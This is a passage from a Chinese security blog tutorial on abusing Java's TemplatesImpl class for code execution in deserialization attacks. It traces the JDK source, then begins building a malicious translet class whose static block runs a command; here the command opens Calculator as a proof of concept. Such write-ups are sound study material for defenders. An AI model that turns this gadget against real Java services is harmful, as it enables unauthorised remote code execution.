<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content><title>TemplatesImpl恶意利用</title><link rel=canonical href=https://example.com/p/templatesimpl%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="TemplatesImpl恶意利用"><meta property='og:description' content><meta property='og:url' content='https://example.com/p/templatesimpl%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8/'><meta property='og:site_name' content="B5juan's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Serialization'><meta property='article:published_time' content='2025-09-17T11:34:48+08:00'><meta property='article:modified_time' content='2025-09-17T11:34:48+08:00'><meta name=twitter:title content="TemplatesImpl恶意利用"><meta name=twitter:description content><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/images/fish.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>B5juan's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu id=main-menu><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-源码跟进>0x01 源码跟进</a><ol><li><a href=#definetransletclasses>defineTransletClasses</a></li><li><a href=#gettransletinstance>getTransletInstance</a></li><li><a href=#newtransformer>newTransformer</a></li></ol></li><li><a href=#0x02-构造payload>0x02 构造payload</a><ol><li><a href=#21-构造恶意类>2.1 构造恶意类</a><ol><li><a href=#211-javac编译>2.1.1 javac编译</a></li><li><a href=#212-javassist>2.1.2 javassist</a></li><li><a href=#213-构造templatesimpl>2.1.3 构造TemplatesImpl</a></li></ol></li><li><a href=#22-利用恶意类>2.2 利用恶意类</a><ol><li><a href=#221-invokertransformer>2.2.1 InvokerTransformer</a></li><li><a href=#222-fastjson>2.2.2 Fastjson</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/security/>Security
</a><a href=/categories/java/>Java</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/templatesimpl%E6%81%B6%E6%84%8F%E5%88%A9%E7%94%A8/>TemplatesImpl恶意利用</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 17, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><h2 id=0x00-前言>0x00 前言</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 是 Java 内置 <code>XSLT</code> 处理器（基于 Apache Xalan）中的一个关键类，它实现了 <code>javax.xml.transform.Templates</code> 接口，用于在内存中表示编译后的 <code>XSLT</code> 样式表。该类通过 <code>newTransformer()</code> 方法创建 <code>Transformer</code> 实例，用于执行 XML → XML/HTML/Text 转换。<code>TemplatesImpl</code>类被用于攻击的根本原因是它可以动态加载和执行Java字节码。</p><h2 id=0x01-源码跟进>0x01 源码跟进</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln>1</span><span class=cl><span class=c1>// com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kd>class</span> <span class=nc>TemplatesImpl</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>Templates</span><span class=p>,</span><span class=w> </span><span class=n>Serializable</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=w>    </span><span class=c1>// ...</span><span class=w>
</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=cm>     * Contains the actual class definition for the translet class and
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=cm>     * any auxiliary classes.
</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=w> </span><span class=n>_bytecodes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>9</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h3 id=definetransletclasses>defineTransletClasses</h3><p><code>_bytecodes</code>字段是一个<code>byte[][]</code>类型的数组，用于存储<code>translet</code>类和任何辅助类的实际类定义字节码。查看<code>TemplatesImpl</code>类源码，可以发现<code>_bytecodes</code>仅在<code>defineTransletClasses()</code>方法中被自定义的类加载器<code>TransletClassLoader</code>加载。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=cm>     * Defines the translet class and auxiliary classes.
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=cm>     * Returns a reference to the Class object that defines the main class
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>defineTransletClasses</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_bytecodes</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>            </span><span class=n>ErrorMsg</span><span class=w> </span><span class=n>err</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ErrorMsg</span><span class=p>(</span><span class=n>ErrorMsg</span><span class=p>.</span><span class=na>NO_TRANSLET_CLASS_ERR</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=p>(</span><span class=n>err</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>        </span><span class=n>TransletClassLoader</span><span class=w> </span><span class=n>loader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>TransletClassLoader</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>            </span><span class=n>AccessController</span><span class=p>.</span><span class=na>doPrivileged</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>PrivilegedAction</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>                </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>run</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>                    </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransletClassLoader</span><span class=p>(</span><span class=n>ObjectFactory</span><span class=p>.</span><span class=na>findClassLoader</span><span class=p>(),</span><span class=n>_tfactory</span><span class=p>.</span><span class=na>getExternalExtensionsMap</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>            </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>            </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>classCount</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_bytecodes</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>            </span><span class=n>_class</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[</span><span class=n>classCount</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>classCount</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w>                </span><span class=n>_auxClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>classCount</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>29</span><span class=cl><span class=w>                </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>loader</span><span class=p>.</span><span class=na>defineClass</span><span class=p>(</span><span class=n>_bytecodes</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=w>                </span><span class=kd>final</span><span class=w> </span><span class=n>Class</span><span class=w> </span><span class=n>superClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getSuperclass</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=w>                </span><span class=c1>// Check if this is the main class</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>33</span><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>superClass</span><span class=p>.</span><span class=na>getName</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=n>ABSTRACT_TRANSLET</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>34</span><span class=cl><span class=w>                    </span><span class=n>_transletIndex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>36</span><span class=cl><span class=w>                </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>37</span><span class=cl><span class=w>                    </span><span class=n>_auxClasses</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>getName</span><span class=p>(),</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>38</span><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>39</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>40</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>41</span><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=c1>// ...</span><span class=w>
</span></span></span><span class=line><span class=ln>42</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>可以看到，加载出来的类对象都被放入了<code>_class</code>字段。然后通过遍历类对象的父类是否等于<code>ABSTRACT_TRANSLET</code>来判断该类对象是否是主类，并把主类的索引保存在<code>_transletIndex</code>字段中。<code>ABSTRACT_TRANSLET</code>则是个静态变量：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln>1</span><span class=cl><span class=c1>// com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=cm>     * Name of the superclass of all translets. This is needed to
</span></span></span><span class=line><span class=ln>4</span><span class=cl><span class=cm>     * determine which, among all classes comprising a translet,
</span></span></span><span class=line><span class=ln>5</span><span class=cl><span class=cm>     * is the main one.
</span></span></span><span class=line><span class=ln>6</span><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=ln>7</span><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>ABSTRACT_TRANSLET</span><span class=w>
</span></span></span><span class=line><span class=ln>8</span><span class=cl><span class=w>        </span><span class=o>=</span><span class=w> </span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><h3 id=gettransletinstance>getTransletInstance</h3><p>那么<code>defineTransletClasses()</code>方法在哪里被调用，存储在<code>_class</code>字段中的类对象又在哪里被取出来实例化呢？前者可以找到<code>getTransletClasses()</code>、<code>getTransletIndex()</code>、<code>getTransletInstance()</code> 三个方法，后者则仅在<code>getTransletInstance()</code>方法。跟进<code>getTransletInstance()</code>方法：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>Translet</span><span class=w> </span><span class=nf>getTransletInstance</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_name</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_class</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=n>defineTransletClasses</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>            </span><span class=c1>// The translet needs to keep a reference to all its auxiliary</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>            </span><span class=c1>// class to prevent the GC from collecting them</span><span class=w>
</span></span></span><span class="line hl"><span class=ln>10</span><span class=cl><span class=w>            </span><span class=n>AbstractTranslet</span><span class=w> </span><span class=n>translet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>)</span><span class=w> </span><span class=n>_class</span><span class=o>[</span><span class=n>_transletIndex</span><span class=o>]</span><span class=p>.</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>postInitialization</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setTemplates</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setOverrideDefaultParser</span><span class=p>(</span><span class=n>_overrideDefaultParser</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>            </span><span class=n>translet</span><span class=p>.</span><span class=na>setAllowedProtocols</span><span class=p>(</span><span class=n>_accessExternalStylesheet</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_auxClasses</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>                </span><span class=n>translet</span><span class=p>.</span><span class=na>setAuxiliaryClasses</span><span class=p>(</span><span class=n>_auxClasses</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>translet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>        </span><span class=k>catch</span><span class=w> </span><span class=c1>// ...</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>可以看到，如果类对象都还没有被放入<code>_class</code>字段就会调用<code>defineTransletClasses()</code>方法完成这一步骤，而后根据主类索引<code>_transletIndex</code>取出主类对象进行实例化。所以如果构造类对象时在构造方法或者<code>static {}</code>代码块中插入恶意代码，恶意代码就会在这里被执行。</p><ul><li>从实例化后的强制类型转换和<code>defineTransletClasses()</code>方法中的主类判断可知，主类必须继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 类</li></ul><h3 id=newtransformer>newTransformer</h3><p>但是<code>getTransletInstance()</code>方法被<code>private</code>修饰，所以必须在<code>TemplatesImpl</code>类中找到调用该方法的入口点。简单跟进可以发现<code>getTransletInstance()</code>方法仅在<code>newTransformer()</code>方法中被调用，<code>newTransformer()</code>方法是个<code>public</code>方法，符合要求：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>synchronized</span><span class=w> </span><span class=n>Transformer</span><span class=w> </span><span class=nf>newTransformer</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransformerConfigurationException</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>        </span><span class=n>TransformerImpl</span><span class=w> </span><span class=n>transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>
</span></span></span><span class="line hl"><span class=ln> 6</span><span class=cl><span class=w>        </span><span class=n>transformer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerImpl</span><span class=p>(</span><span class=n>getTransletInstance</span><span class=p>(),</span><span class=w> </span><span class=n>_outputProperties</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>            </span><span class=n>_indentNumber</span><span class=p>,</span><span class=w> </span><span class=n>_tfactory</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_uriResolver</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>            </span><span class=n>transformer</span><span class=p>.</span><span class=na>setURIResolver</span><span class=p>(</span><span class=n>_uriResolver</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>_tfactory</span><span class=p>.</span><span class=na>getFeature</span><span class=p>(</span><span class=n>XMLConstants</span><span class=p>.</span><span class=na>FEATURE_SECURE_PROCESSING</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>            </span><span class=n>transformer</span><span class=p>.</span><span class=na>setSecureProcessing</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>至此可知，当可以控制<code>TemplatesImpl</code>实例的<code>_bytecodes</code>字段并调用<code>newTransformer()</code>方法时，就可以执行任意代码。</p><h2 id=0x02-构造payload>0x02 构造payload</h2><h3 id=21-构造恶意类>2.1 构造恶意类</h3><p><code>TemplatesImpl</code>加载的是<code>byte[][]</code>类型的字节码数组，数组中每一个元素都是一个类字节码定义，因此我们需要提供的是恶意类编译后的字节码数据。有两种方法获取字节码数据：</p><h4 id=211-javac编译>2.1.1 javac编译</h4><p>构造一个恶意类之后，使用<code>javac</code>命令编译为<code>.class</code>文件，再从文件系统中读取该文件获取字节码。恶意类示例：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Evil</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>            </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=s>&#34;open -a Calculator&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=o>[]</span><span class=w> </span><span class=n>handlers</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
